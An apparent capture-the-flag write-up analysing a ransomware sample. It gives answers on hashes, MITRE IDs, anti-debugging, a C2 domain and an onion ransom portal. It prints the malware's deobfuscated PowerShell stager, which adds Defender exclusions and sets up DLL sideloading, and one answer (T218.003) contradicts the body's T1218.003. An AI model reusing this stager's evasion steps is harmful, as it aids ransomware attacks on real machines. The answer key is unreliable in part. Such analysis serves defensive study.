# Analysis
- Firstly, open vhdx file with SysTools VHDX Viewer, there is a obfucated js code, and other files. Based on time created in Viewer, the first file is created is redbadger.webp
Q1: hash of redbadger.webp after computing is 2c92c3905a8b978787e83632739f7071
- Check file rad897C.tmp, got the string that ransomware using to check admin privileges
Q2: S-1-5-32-544
- Convert vhdk disk to raw format and extract file by FTK Imager:
```bash
.\qemu-img.exe convert  -f vhdx -O raw ..\LockPick4.0\defenderscan.vhdx defenderscan.raw
```
- After examinating rad897c.tmp file, it's clearly that malware manipulate cmstp.exe to run malicious script. MITRE ATT&CK cmstp.exe corresponding to it is T1218.003
- Also in rad897c.tmp file, msmpeng.exe is a component of window defender is used for starting process after checking admin privilege
```bash
$frodo = "bXNtcGVuZy5leGU="  #msmpeng.exe
$samwise = "bXBzdmMuZGxs"    #mpsvc.dll
$aragorn = "ZGVmZW5kZXJzY2FuLmpzOmxvbGJpbg==" #defenderscan.js:lolbin
$legolas = "ZGVmZW5kZXJzY2FuLmpzOnBheWxvYWQ=" #defenderscan.js:payload

if (Test-HobbitInCouncil)
{
    if(-Not (Test-MordorElevation))
    {
        Bypass-GondorGate
    }
    else {
        $gandalf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($frodo))
        Add-MpPreference -ExclusionProcess $gandalf
		Add-MpPreference -ExclusionPath (Get-Item .).FullName
        $boromir = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aragorn))
        $gandalfContent = Get-Content $currentDirectory\$boromir -Encoding Byte -ReadCount 0
        Set-Content $currentDirectory\$gandalf -Encoding Byte -Value $gandalfContent
        $gimli = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($legolas))
        $aragorn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($samwise))
        $aragornContent = Get-Content $currentDirectory\$gimli -Encoding Byte -ReadCount 0
        Set-Content $currentDirectory\$aragorn -Encoding Byte -Value $aragornContent
        $proc = Start-Process $currentDirectory\$gandalf -Wait
        Remove-Item $currentDirectory\$gandalf
        Remove-Item $currentDirectory\$aragorn
    }
}
```
Q4: View the properties of file msmpeng.exe is Microsoft Corporation
- The next part is disassemble code of msmpeng.exe and mpsvc.dll. In msmpeng.exe file, this call a function named ServiceCrtMain
```bash
.text:0000000140001010                 public AbsMain
.text:0000000140001010 AbsMain         proc near               ; DATA XREF: .rdata:__guard_fids_table↓o
.text:0000000140001010                                         ; .pdata:ExceptionDir↓o
.text:0000000140001010                 sub     rsp, 28h
.text:0000000140001014                 call    __security_init_cookie
.text:0000000140001019                 xor     edx, edx
.text:000000014000101B                 xor     ecx, ecx
.text:000000014000101D                 call    cs:__imp_ServiceCrtMain
.text:0000000140001023                 xor     ecx, ecx
.text:0000000140001025                 test    eax, eax
.text:0000000140001027                 sets    cl              ; uExitCode
.text:000000014000102A                 call    cs:__imp_ExitProcess
```
- This function is imported from mpsvc.dll, I check this file is packed, then this should be the final payload
Q5: ServiceCrtMain
- About antidebug techniques, first:
+ using IsDebuggerPresent api
```bash
if ( IsDebuggerPresent() )
    goto LABEL_36;
```
+ check powershell is running or not, then break if not running
```bash
CurrentProcessId = GetCurrentProcessId();
  memset(&pe.cntUsage, 0, 0x234ui64);
  pe.dwSize = 568;
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  v2 = Toolhelp32Snapshot;
  if ( Toolhelp32Snapshot != (HANDLE)-1i64 && Process32FirstW(Toolhelp32Snapshot, &pe) )
  {
    while ( pe.th32ProcessID != CurrentProcessId )
    {
      if ( !Process32NextW(v2, &pe) )
        goto LABEL_6;
    }
    th32ParentProcessID = pe.th32ParentProcessID;
    if ( pe.th32ParentProcessID != -1 )
    {
      pe.dwSize = 568;
      if ( Process32FirstW(v2, &pe) )
      {
        while ( pe.th32ProcessID != th32ParentProcessID )
        {
          if ( !Process32NextW(v2, &pe) )
            goto LABEL_6;
        }
        if ( wcsicmp(pe.szExeFile, L"powershell.exe") )
          exit(0);
      }
    }
  }
```
+ Final technique is using custom exception handler
```bash
__int64 sub_180001EB0()
{
  SetUnhandledExceptionFilter(UnhandledExceptionFilter);
  __debugbreak();
  return 1i64;
}
```
Q6: 3, SetUnhandledExceptionFilter
- Use msmpeng.exe to load mpsvc.dll, no doubt this is dll sideloading: T1574.002
Q9: T1574.002
- Running malicious malware leads to ransom note that includes url for services portal, also file extension encryption
Q10: yrwm7tdvrtejpx7ogfhax2xuxkqejp2qjb634qwwyoyabkt2eydssrad.onion:9001
Q11: .evil
# Questions
## 1. What is the MD5 hash of the first file the ransomware writes to disk?
- 2c92c3905a8b978787e83632739f7071
## 2. What is the string that the ransomware uses to check for local administrator privileges?
- S-1-5-32-544
## 3. What is the MITRE ATT&CK ID for the technique used by the threat actor to elevate their privileges?
- T218.003
## 4. The ransomware starts a process using a signed binary, what is the full name of the signer?
- Microsoft Corporation
## 5. What is the final payloads' entry point function?
- ServiceCrtMain
## 6. How many Anti-Debugging techniques does the ransomware implement and what is the Windows API function that the final technique leverages?
- 3, SetUnhandledExceptionFilter
## 7. The ransomware targets files with specific extensions, what is the list of extensions targeted in the exact order as the ransomware configuration stores them?
- .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pdf, .txt, .csv, .rtf
## 8. What is the FQDN of the ransomware server the malware connects to?
- api.ltchealthcare.co
## 9. What is the MITRE ATT&CK ID the ransomware uses to run its final payload?
- T1574.002
## 10. What is the full URL including port number of the ransomware groups customer service portal?
- yrwm7tdvrtejpx7ogfhax2xuxkqejp2qjb634qwwyoyabkt2eydssrad.onion:9001
## 11. What is the file extension used to store the newly encrypted files?
- .evil